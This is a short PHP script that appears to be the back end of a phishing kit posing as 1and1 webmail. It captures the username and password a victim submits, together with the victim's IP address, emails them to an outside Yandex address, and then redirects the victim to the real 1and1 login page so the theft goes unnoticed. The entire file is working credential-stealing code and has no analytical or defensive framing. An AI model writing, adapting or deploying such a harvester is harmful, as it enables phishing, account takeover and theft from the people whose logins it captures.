<?   

$ip = getenv("REMOTE_ADDR");
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$send = "m4il.recovery@yandex.com";
$subject = "~ webmail ~";
$headers = "From: Shocker<logs@1and1>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://webmail.1and1.co.uk/");
	  

?>